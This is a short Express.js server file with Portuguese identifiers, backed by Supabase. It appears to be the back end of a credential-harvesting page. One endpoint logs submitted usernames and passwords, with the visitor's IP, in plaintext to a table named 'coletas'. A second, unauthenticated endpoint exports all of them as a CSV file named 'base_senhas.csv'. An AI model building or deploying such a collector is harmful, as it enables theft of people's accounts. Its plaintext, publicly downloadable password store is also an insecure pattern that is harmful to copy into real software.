const express = require("express");
const path = require("path");
const app = express();

require('dotenv').config();
const { createClient } = require("@supabase/supabase-js");

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

app.use(express.json());
app.use(express.static("public"));

app.post("/cadastrar", async (req, res) => {
    const { usuario, senha } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const { error } = await supabase
        .from('coletas')
        .insert([
            { usuario: usuario, senha: senha, ip: ip }
        ]);

    if (error) {
        res.status(500).json({ status: 'erro', mensagem: 'Erro ao salvar no banco.' });
        console.log(error);
    }

    res.json({ status: 'success', mensagem: 'Senha registrada com sucesso!' });
});

app.get('/download', async (req, res) => {
    const {data:rows, error} = await supabase
        .from('coletas')
        .select('*');

    let csv = "\uFEFFID;Usuario;Senha;Data_Hora;IP\n";
    
    rows.forEach(row => {
        csv += `${row.id};${row.usuario};${row.senha};${row.data_hora};${row.ip}\n`;
    });

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=base_senhas.csv');
    res.status(200).send(csv);
});

app.listen(process.env.PORT || 3000, () => console.log('Servidor rodando na porta 3000'));